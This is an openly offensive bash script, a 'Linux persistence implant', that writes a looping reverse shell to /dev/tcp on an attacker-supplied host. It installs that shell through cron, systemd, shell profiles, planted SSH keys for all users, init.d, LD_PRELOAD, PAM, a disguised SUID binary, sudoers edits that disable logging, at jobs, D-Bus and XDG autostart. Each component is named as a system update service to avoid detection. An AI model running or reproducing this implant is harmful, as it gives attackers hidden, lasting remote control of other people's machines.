#!/bin/bash

# Linux Persistence Implant Script
# Usage: ./persistence.sh <lhost> <lport>
# Author: S4int

# Check for arguments
if [ $# -ne 2 ]; then
    echo "Usage: $0 <lhost> <lport>"
    exit 1
fi

LHOST="$1"
LPORT="$2"
CURRENT_USER=$(whoami)
CURRENT_PATH=$(pwd)
SHELL_NAME="system_daemon"
SHELL_PATH="/tmp/.${SHELL_NAME}"
TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S")

# Reverse shell payload function
generate_reverse_shell() {
    echo "#!/bin/bash
while true; do
    bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' 2>/dev/null
    sleep 60
done" > "$SHELL_PATH"
    chmod +x "$SHELL_PATH"
}

# Status function
print_status() {
    echo "[*] $1"
}

# Success function
print_success() {
    echo "[+] $1"
}

# Error function
print_error() {
    echo "[!] $1"
}

# Check if we are root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        print_error "Please run as root for full persistence capabilities"
        exit 1
    fi
}

# Create our reverse shell script
create_reverse_shell() {
    print_status "Creating reverse shell script..."
    generate_reverse_shell
    print_success "Reverse shell created at $SHELL_PATH"
}

# 1. Cron Job Persistence
setup_cron_persistence() {
    print_status "Setting up cron persistence..."
    
    # Create a random minute value
    RANDOM_MIN=$((RANDOM % 60))
    
    # Add to crontab (runs every hour)
    (crontab -l 2>/dev/null; echo "$RANDOM_MIN * * * * $SHELL_PATH >/dev/null 2>&1") | crontab -
    
    # Add to system crontab if we have root
    if [ "$EUID" -eq 0 ]; then
        echo "$RANDOM_MIN * * * * root $SHELL_PATH >/dev/null 2>&1" > /etc/cron.d/system_update
    fi
    
    print_success "Cron persistence established"
    # To use: Start a listener with: nc -nlvp $LPORT
    # The connection will arrive every hour at minute $RANDOM_MIN
    print_status "Usage: Start a listener with: nc -nlvp $LPORT"
    print_status "       The connection will arrive every hour at minute $RANDOM_MIN"
}

# 2. Systemd Service Persistence
setup_systemd_persistence() {
    if [ "$EUID" -eq 0 ]; then
        print_status "Setting up systemd persistence..."
        
        # Create systemd service
        cat > /etc/systemd/system/system-updater.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=$SHELL_PATH
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

        # Enable and start the service
        systemctl enable system-updater.service >/dev/null 2>&1
        systemctl start system-updater.service >/dev/null 2>&1
        
        # Create a systemd timer as alternative method
        cat > /etc/systemd/system/system-updater.timer << EOF
[Unit]
Description=Run System Updater periodically

[Timer]
OnBootSec=5min
OnUnitActiveSec=30min

[Install]
WantedBy=timers.target
EOF

        systemctl enable system-updater.timer >/dev/null 2>&1
        systemctl start system-updater.timer >/dev/null 2>&1
        
        print_success "Systemd persistence established"
        # To use: Start a listener with: nc -nlvp $LPORT
        # The service will maintain a persistent connection
        # The timer will create a connection every 30 minutes
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The service will maintain a persistent connection"
        print_status "       The timer will create a connection every 30 minutes"
    else
        print_error "Skipping systemd persistence (requires root)"
    fi
}

# 3. Bash Profile Persistence
setup_bash_profile_persistence() {
    print_status "Setting up bash profile persistence..."
    
    # Add to .bashrc
    echo "# System Update Check - Added $TIMESTAMP" >> ~/.bashrc
    echo "nohup $SHELL_PATH >/dev/null 2>&1 &" >> ~/.bashrc
    
    # Add to .profile
    echo "# System Update Check - Added $TIMESTAMP" >> ~/.profile
    echo "nohup $SHELL_PATH >/dev/null 2>&1 &" >> ~/.profile
    
    # If we're root, add to global profile
    if [ "$EUID" -eq 0 ]; then
        echo "# System Update Service - Added $TIMESTAMP" >> /etc/profile.d/system-update.sh
        echo "if [ \$(id -u) -ne 0 ]; then" >> /etc/profile.d/system-update.sh
        echo "    nohup $SHELL_PATH >/dev/null 2>&1 &" >> /etc/profile.d/system-update.sh
        echo "fi" >> /etc/profile.d/system-update.sh
        chmod +x /etc/profile.d/system-update.sh
    fi
    
    print_success "Bash profile persistence established"
    # To use: Start a listener with: nc -nlvp $LPORT
    # The connection will arrive each time a user logs in or opens a new terminal
    print_status "Usage: Start a listener with: nc -nlvp $LPORT"
    print_status "       The connection will arrive each time a user logs in or opens a new terminal"
}

# 4. SSH Authorized Keys Persistence
setup_ssh_persistence() {
    print_status "Setting up SSH persistence..."
    
    # Check if SSH key exists, if not generate one
    if [ ! -f ~/.ssh/id_rsa ]; then
        mkdir -p ~/.ssh
        ssh-keygen -t rsa -f ~/.ssh/id_rsa -N "" >/dev/null 2>&1
    fi
    
    if [ -f ~/.ssh/id_rsa.pub ]; then
        # Add to authorized_keys
        mkdir -p ~/.ssh
        cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
        chmod 600 ~/.ssh/authorized_keys
        
        # Print the private key for the user to save
        print_status "Save this SSH private key for future access:"
        cat ~/.ssh/id_rsa
    fi
    
    # If we're root, try to add our key to other users
    if [ "$EUID" -eq 0 ]; then
        for homedir in /home/*; do
            username=$(basename "$homedir")
            if [ "$username" != "*" ] && [ -d "$homedir" ]; then
                mkdir -p "$homedir/.ssh" 2>/dev/null
                cat ~/.ssh/id_rsa.pub >> "$homedir/.ssh/authorized_keys" 2>/dev/null
                chown -R "$username":"$username" "$homedir/.ssh" 2>/dev/null
                chmod 700 "$homedir/.ssh" 2>/dev/null
                chmod 600 "$homedir/.ssh/authorized_keys" 2>/dev/null
            fi
        done
        
        # Add to root authorized_keys
        mkdir -p /root/.ssh
        cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
        chmod 700 /root/.ssh
        chmod 600 /root/.ssh/authorized_keys
    fi
    
    print_success "SSH persistence established"
    # To use: Save the displayed private key to a file (e.g., stolen_key.pem)
    # chmod 600 stolen_key.pem
    # ssh -i stolen_key.pem user@target_ip
    # This provides direct SSH access without the reverse shell listener
    print_status "Usage: Save the private key shown above to a file (e.g., stolen_key.pem)"
    print_status "       chmod 600 stolen_key.pem"
    print_status "       ssh -i stolen_key.pem $CURRENT_USER@[target_ip]"
    print_status "       This provides direct SSH access without needing a listener"
}

# 5. Init.d Startup Script Persistence
setup_init_persistence() {
    if [ "$EUID" -eq 0 ]; then
        print_status "Setting up init.d persistence..."
        
        # Create init.d script
        cat > /etc/init.d/system-update << EOF
#!/bin/sh
### BEGIN INIT INFO
# Provides:          system-update
# Required-Start:    \$network \$remote_fs \$syslog
# Required-Stop:     \$network \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Update Service
# Description:       Runs system update tasks in the background
### END INIT INFO

case "\$1" in
    start)
        $SHELL_PATH &
        ;;
    stop)
        killall -q $(basename $SHELL_PATH)
        ;;
    restart)
        killall -q $(basename $SHELL_PATH)
        $SHELL_PATH &
        ;;
    *)
        echo "Usage: \$0 {start|stop|restart}"
        exit 1
        ;;
esac
exit 0
EOF

        chmod +x /etc/init.d/system-update
        
        # Update rc.d
        if command -v update-rc.d > /dev/null 2>&1; then
            update-rc.d system-update defaults >/dev/null 2>&1
        elif command -v chkconfig > /dev/null 2>&1; then
            chkconfig --add system-update >/dev/null 2>&1
        fi
        
        print_success "Init.d persistence established"
        # To use: Start a listener with: nc -nlvp $LPORT
        # The connection will arrive each time the system boots
        # Or manually trigger with: /etc/init.d/system-update start
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The connection will arrive each time the system boots"
        print_status "       Or manually trigger with: /etc/init.d/system-update start"
    else
        print_error "Skipping init.d persistence (requires root)"
    fi
}

# 6. Preload Library Persistence (Advanced)
setup_preload_persistence() {
    if [ "$EUID" -eq 0 ]; then
        print_status "Setting up LD_PRELOAD persistence (advanced)..."
        
        # Create a C file for the preload library
        cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

// Function that will be executed when the library is loaded
__attribute__((constructor)) void init(void) {
    // Only run this when the user is root
    if (geteuid() == 0) {
        // Fork to background
        if (fork() == 0) {
            // Close standard file descriptors
            fclose(stdin);
            fclose(stdout);
            fclose(stderr);
            
            // Execute our payload
            system("SHELL_PATH_PLACEHOLDER &");
            exit(0);
        }
    }
}
EOF

        # Replace placeholder with actual shell path
        sed -i "s|SHELL_PATH_PLACEHOLDER|$SHELL_PATH|g" /tmp/preload.c
        
        # Try to compile (requires gcc)
        if command -v gcc > /dev/null 2>&1; then
            gcc -shared -fPIC /tmp/preload.c -o /usr/lib/libsystem.so
            echo "/usr/lib/libsystem.so" > /etc/ld.so.preload
            print_success "LD_PRELOAD persistence established"
            # To use: Start a listener with: nc -nlvp $LPORT
            # The connection will arrive each time a setuid program is executed
            # Particularly when a user performs a sudo command
            print_status "Usage: Start a listener with: nc -nlvp $LPORT"
            print_status "       The connection will arrive each time a setuid program is executed"
            print_status "       Particularly effective when a user performs a sudo command"
        else
            print_error "gcc not found, skipping LD_PRELOAD persistence"
        fi
        
        # Clean up
        rm -f /tmp/preload.c
    else
        print_error "Skipping LD_PRELOAD persistence (requires root)"
    fi
}

# 7. PAM Persistence (Advanced)
setup_pam_persistence() {
    if [ "$EUID" -eq 0 ]; then
        print_status "Setting up PAM persistence (advanced)..."
        
        # Create a PAM config file to execute our shell
        cat > /etc/pam.d/system-update << EOF
session optional pam_exec.so seteuid $SHELL_PATH
EOF

        # Add our PAM module to common-session
        echo "session optional pam_exec.so seteuid $SHELL_PATH" >> /etc/pam.d/common-session
        
        print_success "PAM persistence established"
        # To use: Start a listener with: nc -nlvp $LPORT
        # The connection will arrive each time a user logs in or authenticates
        # Examples: ssh login, su, sudo, etc.
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The connection will arrive each time a user logs in or authenticates"
        print_status "       Examples: ssh login, su, sudo, etc."
    else
        print_error "Skipping PAM persistence (requires root)"
    fi
}

# 8. SUID Binary Persistence (Advanced)
setup_suid_persistence() {
    if [ "$EUID" -eq 0 ]; then
        print_status "Setting up SUID binary persistence (advanced)..."
        
        # Create a SUID C program
        cat > /tmp/suid.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    // Drop privileges temporarily
    setuid(getuid());
    
    // Execute the payload
    system("SHELL_PATH_PLACEHOLDER &");
    
    // Execute a legitimate program to avoid suspicion
    execl("/usr/bin/id", "id", NULL);
    
    return 0;
}
EOF

        # Replace placeholder with actual shell path
        sed -i "s|SHELL_PATH_PLACEHOLDER|$SHELL_PATH|g" /tmp/suid.c
        
        # Try to compile (requires gcc)
        if command -v gcc > /dev/null 2>&1; then
            gcc /tmp/suid.c -o /usr/local/bin/system-helper
            
            # Set SUID bit
            chmod 4755 /usr/local/bin/system-helper
            
            print_success "SUID binary persistence established at /usr/local/bin/system-helper"
            # To use: Start a listener with: nc -nlvp $LPORT
            # Then trigger by having any user run: /usr/local/bin/system-helper
            # The program appears to run "id" command but secretly triggers a reverse shell
            print_status "Usage: Start a listener with: nc -nlvp $LPORT"
            print_status "       Then trigger by having any user run: /usr/local/bin/system-helper"
            print_status "       The program appears to run 'id' command but secretly triggers a reverse shell"
        else
            print_error "gcc not found, skipping SUID persistence"
        fi
        
        # Clean up
        rm -f /tmp/suid.c
    else
        print_error "Skipping SUID persistence (requires root)"
    fi
}

# 9. Kernel Module Persistence (Very Advanced - not implementing due to high risk)
setup_kernel_persistence() {
    if [ "$EUID" -eq 0 ]; then
        print_status "Kernel module persistence is very advanced and risky - skipping"
        print_status "Requires kernel headers and can destabilize the system"
    fi
}

# 10. At Job Persistence
setup_at_persistence() {
    print_status "Setting up at job persistence..."
    
    # Schedule an at job for 1 hour from now
    echo "$SHELL_PATH" | at now + 1 hour 2>/dev/null
    
    # Schedule an at job for midnight
    echo "$SHELL_PATH" | at midnight 2>/dev/null
    
    print_success "At job persistence established"
    # To use: Start a listener with: nc -nlvp $LPORT
    # The connection will arrive at scheduled times:
    # - 1 hour from now
    # - At midnight
    print_status "Usage: Start a listener with: nc -nlvp $LPORT"
    print_status "       The connection will arrive at scheduled times:"
    print_status "       - 1 hour from now"
    print_status "       - At midnight"
}

# 11. Sudo Configuration Persistence
setup_sudo_persistence() {
    if [ "$EUID" -eq 0 ]; then
        print_status "Setting up sudo persistence..."
        
        # Create a sudo plugin that runs our shell
        echo "Defaults env_keep += \"SHELLPATH\"" > /etc/sudoers.d/persistence
        echo "Defaults env_reset,SHELLPATH=$SHELL_PATH" >> /etc/sudoers.d/persistence
        echo "Defaults !syslog" >> /etc/sudoers.d/persistence
        
        # Make sure permissions are correct
        chmod 440 /etc/sudoers.d/persistence
        
        print_success "Sudo persistence established"
        # To use: Start a listener with: nc -nlvp $LPORT
        # The connection will arrive each time any user performs a sudo command
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The connection will arrive each time any user performs a sudo command"
    else
        print_error "Skipping sudo persistence (requires root)"
    fi
}

# 12. User Crontab Persistence (Different from System Cron)
setup_user_crontab_persistence() {
    print_status "Setting up user crontab persistence..."
    
    # Create a random minute value
    RANDOM_MIN=$((RANDOM % 60))
    
    # Add to crontab using environment variables
    (crontab -l 2>/dev/null; echo "SHELL=/bin/bash") | crontab -
    (crontab -l 2>/dev/null; echo "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin") | crontab -
    (crontab -l 2>/dev/null; echo "$RANDOM_MIN * * * * $SHELL_PATH >/dev/null 2>&1") | crontab -
    
    print_success "User crontab persistence established"
    # To use: Start a listener with: nc -nlvp $LPORT
    # The connection will arrive every hour at minute $RANDOM_MIN
    # This persistence uses the current user's crontab
    print_status "Usage: Start a listener with: nc -nlvp $LPORT"
    print_status "       The connection will arrive every hour at minute $RANDOM_MIN"
    print_status "       This persistence uses the current user's crontab"
}

# 13. D-Bus Persistence (Advanced)
setup_dbus_persistence() {
    if [ "$EUID" -eq 0 ]; then
        print_status "Setting up D-Bus persistence (advanced)..."
        
        # Create a D-Bus service file
        mkdir -p /usr/share/dbus-1/system-services
        cat > /usr/share/dbus-1/system-services/org.system.Update.service << EOF
[D-BUS Service]
Name=org.system.Update
Exec=$SHELL_PATH
User=root
EOF

        # Create a D-Bus config file
        mkdir -p /etc/dbus-1/system.d
        cat > /etc/dbus-1/system.d/org.system.Update.conf << EOF
<!DOCTYPE busconfig PUBLIC "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
<busconfig>
  <policy user="root">
    <allow own="org.system.Update"/>
  </policy>
  <policy context="default">
    <allow send_destination="org.system.Update"/>
  </policy>
</busconfig>
EOF

        print_success "D-Bus persistence established"
        # To use: Start a listener with: nc -nlvp $LPORT
        # The connection will be triggered when D-Bus activates the service
        # Can be manually activated with: dbus-send --system --dest=org.system.Update /org/system/Update
        print_status "Usage: Start a listener with: nc -nlvp $LPORT"
        print_status "       The connection will be triggered when D-Bus activates the service"
        print_status "       Can be manually activated with: dbus-send --system --dest=org.system.Update /org/system/Update"
    else
        print_error "Skipping D-Bus persistence (requires root)"
    fi
}

# 14. XDG Autostart Persistence
setup_xdg_persistence() {
    print_status "Setting up XDG autostart persistence..."
    
    # Create autostart directory if it doesn't exist
    mkdir -p ~/.config/autostart
    
    # Create a desktop entry file
    cat > ~/.config/autostart/system-update.desktop << EOF
[Desktop Entry]
Type=Application
Name=System Update
Exec=$SHELL_PATH
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Comment=System Update Service
EOF

    # If we're root, add for all users
    if [ "$EUID" -eq 0 ]; then
        mkdir -p /etc/xdg/autostart
        cat > /etc/xdg/autostart/system-update.desktop << EOF
[Desktop Entry]
Type=Application
Name=System Update
Exec=$SHELL_PATH
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Comment=System Update Service
EOF
    fi
    
    print_success "XDG autostart persistence established"
    # To use: Start a listener with: nc -nlvp $LPORT
    # The connection will arrive each time a user logs into a graphical desktop session
    print_status "Usage: Start a listener with: nc -nlvp $LPORT"
    print_status "       The connection will arrive each time a user logs into a graphical desktop session"
}

# Main function
main() {
    print_status "Starting persistence installation..."
    print_status "Target: $LHOST:$LPORT"
    
    # Check if we're root
    check_root
    
    # Create the reverse shell script
    create_reverse_shell
    
    # Install persistence mechanisms
    setup_cron_persistence
    setup_systemd_persistence
    setup_bash_profile_persistence
    setup_ssh_persistence
    setup_init_persistence
    setup_user_crontab_persistence
    setup_xdg_persistence
    setup_at_persistence
    
    # Advanced persistence mechanisms (root only)
    setup_preload_persistence
    setup_pam_persistence
    setup_suid_persistence
    setup_sudo_persistence
    setup_dbus_persistence
    
    print_status "Persistence installation complete!"
    print_status "Multiple persistence mechanisms installed"
    print_status "The system will connect back to $LHOST:$LPORT"
    
    echo ""
    echo "==================== PERSISTENCE SUMMARY ===================="
    echo "Target: $LHOST:$LPORT"
    echo "Reverse shell location: $SHELL_PATH"
    echo ""
    echo "Persistence mechanisms installed:"
    echo "1. Cron Job (System & User) - Triggers every hour at minute $RANDOM_MIN"
    echo "2. Systemd Service & Timer - Persistent connection + 30min intervals"
    echo "3. Bash Profile - Triggers on user login and new terminals"
    echo "4. SSH Keys - Direct access without listener"
    echo "5. Init.d Script - Triggers on system boot"
    echo "6. LD_PRELOAD - Triggers on setuid program execution"
    echo "7. PAM Module - Triggers on user authentication"
    echo "8. SUID Binary - Manually triggered via /usr/local/bin/system-helper"
    echo "9. At Jobs - Triggers at scheduled times"
    echo "10. Sudo Configuration - Triggers on sudo command use"
    echo "11. D-Bus Service - Can be manually triggered"
    echo "12. XDG Autostart - Triggers on desktop login"
    echo ""
    echo "To regain access, start a listener with: nc -nlvp $LPORT"
    echo "For SSH access, use the private key displayed above"
    echo "============================================================"
}

# Run the main function
main
